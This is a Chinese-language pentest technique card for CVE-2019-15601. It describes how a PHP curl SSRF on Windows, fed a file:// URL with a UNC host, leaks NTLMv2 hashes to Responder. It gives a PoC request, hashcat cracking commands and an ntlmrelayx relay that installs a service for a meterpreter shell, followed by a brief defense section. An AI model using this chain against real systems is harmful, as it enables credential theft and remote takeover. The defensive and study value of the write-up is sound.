---
id: web-generic-ssrf-curl-file-unc-smb-smuggling-ntlm-relay
title: Windows libcurl ≤7.67 的 file:// 后接 UNC 走私 SMB：SSRF 泄露 NTLMv2 哈希，爆破口令或 ntlmrelayx 中继拿 RCE（CVE-2019-15601）
type: scenario
domain: web
path: web/generic/ssrf
technique: curl-file-unc-smb-smuggling-ntlm-leak-relay
aliases:
- CVE-2019-15601
- SMB access smuggling via FILE URL
- file 协议 UNC SMB
- SSRF 泄露 NTLM
- ssrf smb 中继
- file://///host/c$
tags:
- web
- ssrf
- php
- curl
- windows
- smb
- ntlm
- ntlm-relay
- credential-leak
- cve
cve:
- CVE-2019-15601
affected_versions: libcurl 4.0–7.67.0（7.68.0 修复 CVE-2019-15601；原文 Windows libcurl 7.64.0 实测）
severity: high
confidence: high
status: verified
created: '2026-11-13'
updated: '2026-11-13'
verification:
  verified_by: verifier-V639
  verified_at: '2026-11-13T02:16:29+08:00'
  notes: 已对照原文与截图核对：CVE-2019-15601截图中Affected 4.0-7.67.0、Not affected >=7.68.0(图22)，与affected_versions一致(原文正文另有'libcurl<=7.68.0'的不精确引述，以CVE截图为准)；file://///192.168.0.105/c$/windows/win.ini请求(图23)、Responder捕获DESKTOP-...\Administrator NTLMv2-SSP并hashcat -m 5600破解123456(图24，约23分钟)、ntlmrelayx经SVCManager创建服务后回弹meterpreter(图25)、smb://直连仅支持SMBv1/NT LM 0.12而失败(图20/27-31)均一致。dedup候选为AD侧Responder/中继与UNC泄露卡，本卡是Web SSRF入口，非同链，保留。未验证点：中继要求目标SMB签名非必需且多机环境，原型来自原文单场景实测
---

## 一句话结论

Windows 上的 PHP curl SSRF 若允许 `file://`，在 libcurl ≤ 7.67.0 时把 URL 写成 `file://///attacker/c$/windows/win.ini` 这类“file 后接 UNC 主机”的形式，Windows 会把它当作 `\\attacker\c$\...` 发起 SMB 认证，把运行 PHP 的机器账户/用户 NTLMv2-SSP 哈希泄露给攻击者的 Responder；爆破出明文口令，或对 SMB 签名非必需的其它主机用 ntlmrelayx 中继，进而创建服务拿 RCE（原文实测取得 meterpreter 会话）。

## 原理

- **CVE-2019-15601（SMB access smuggling via FILE URL on Windows）**：libcurl 在 Windows 上处理 `file://` URL 时，若路径以两个斜杠/反斜杠开头并跟主机名，会把后续路径交给 Windows 的 UNC 处理逻辑，变成对 `\\host\share\file` 的 SMB 请求，而不是读本地文件；这不是文档化的 libcurl 行为，7.68.0 修复，影响 4.0–7.67.0。
- **哈希外泄**：SMB 认证默认携带当前用户（服务运行账户，常为管理员）的 NTLMv2 响应；Responder 伪造共享接收 `SMB-NTLMv2-SSP` 哈希（原文抓到 `DESKTOP-...\Administrator`）。
- **离线爆破**：`hashcat -m 5600 <hash> rockyou.txt`，原文约 23 分钟跑出 administrator 口令（弱口令场景）。
- **中继 RCE**：`nmap --script=smb2-security-mode` 确认目标 “Message signing enabled but not required” 后，Responder 关掉 SMB/HTTP 监听、`impacket-ntlmrelayx -t <victim> -smb2support -e shell.exe` 把 SSRF 主机发来的认证中继到受害机；ntlmrelayx 通过 SVCManager 创建并启动服务（原文日志：Creating service、Service Installed、CONNECT），反弹得到 meterpreter 会话。
- **与 smb:// 路径的区别**：原文先试 `smb://host/share/1.txt`，curl 只支持 SMBv1（Negotiate 里 dialect 为 `NT LM 0.12`），要求目标开启 SMB1 且语法/凭据严格，Responder 收不到认证；真正稳定的是 file:// 走私。7.68 之后此路失效。
- **限制**：需要 file:// 协议可用（重定向默认不支持 file，需直接入口允许）；攻击者已在内网且能运行 Responder（多机环境，MS08-068 后无法中继自身）；中继目标 SMB 签名非必需；Windows 目标需能解析到攻击者主机。

## 触发条件

- Windows 版 PHP + libcurl ≤ 7.67.0（`curl_version()` 可确认）。
- SSRF 允许 `file://`（`CURLPROTO_ALL` 或未限制协议）。
- 攻击者主机与 SSRF 主机网络可达，能接收 445 入站（Responder/ntlmrelayx）。
- 需要爆破时，服务账户使用弱口令；需要中继时，存在 SMB 签名非必需的第三方主机且攻击者具备内网位置。

## 利用步骤

1. 确认 SSRF 与 `file://` 可用：`url=file:///c:/windows/win.ini` 能读到内容。
2. Kali 上启动 Responder（`sudo responder -I eth0 -dwv`）。
3. 提交 `url=file://///<attacker-ip>/c$/windows/win.ini`（斜杠数量按环境尝试，等价 UNC 形式），Responder 记录 NTLMv2-SSP 哈希。
4. 爆破：`hashcat -m 5600 SMB-NTLMv2-SSP-<ip>.txt rockyou.txt`；或进入中继分支。
5. 中继：修改 `Responder.conf` 关闭 SMB/HTTP，`sudo responder -I eth0 -v`；另一终端 `impacket-ntlmrelayx -t <victim> -smb2support -e shell.exe`；再次触发 SSRF，观察 ntlmrelayx 创建服务并回连。
6. 用拿到的明文口令/会话横向，读取共享与登录主机。

## PoC

```http
GET /ssrf.php?url=file://///192.168.0.105/c$/windows/win.ini HTTP/1.1
Host: 192.168.0.123
```

Responder 侧：

```text
[SMB] NTLMv2-SSP Client   : 192.168.0.123
[SMB] NTLMv2-SSP Username : DESKTOP-XXXX\Administrator
[SMB] NTLMv2-SSP Hash     : Administrator::DESKTOP-XXXX:...
```

```bash
hashcat -m 5600 /usr/share/responder/logs/SMB-NTLMv2-SSP-192.168.0.123.txt /usr/share/wordlists/rockyou.txt
# 原文结果：Recovered 1/1，口令 123456

# 中继
impacket-ntlmrelayx -t 192.168.0.128 -smb2support -e shell.exe
# ntlmrelayx 日志：Creating service ... Service Installed.. CONNECT!
# Metasploit：meterpreter session 1 opened (192.168.0.120:4444 -> 192.168.0.128:49737)
```

## 变体与关联

- 直接 `smb://user:pass@host/share/file` 也可在 curl 内置 SMBv1 支持、目标开启 SMB1 时读共享（原文明文/来宾访问测试），但无法触发 NTLM 泄露到 Responder，实用性低于 file:// 走私。
- 与 `pentest-ad-responder-smb-relay-multirelay-ntlmrelayx`、`pentest-ad-ntlmv2-smb-pcap-hashcat-crack` 衔接：本卡提供“从 Web SSRF 制造内网 SMB 认证”的入口，AD 卡提供中继/爆破细节。
- 与 `web-generic-ssrf-curl-pathinfo-extension-windows-fragment-query-bypass` 同属 Windows file:// 利用；那张是后缀白名单绕过读文件，本卡是把 file 变成 SMB 认证外泄。

## 检测与防御

- 升级 libcurl ≥ 7.68.0；PHP 中限制 `CURLOPT_PROTOCOLS` 为 HTTP/HTTPS，禁用 file/scp。
- Windows 上禁止服务账户弱口令；SMB 强制签名（`RequireSecuritySignature`）可阻断中继。
- 监控出站 445 连接与 file:// 参数中的多斜杠/反斜杠主机形式；Responder 流量在 IDS 中表现为异常的 SMB 认证与 LLMNR/NBT-NS 响应。
- 限制 Web 服务账户权限，避免以域管/本地管理员运行 PHP。
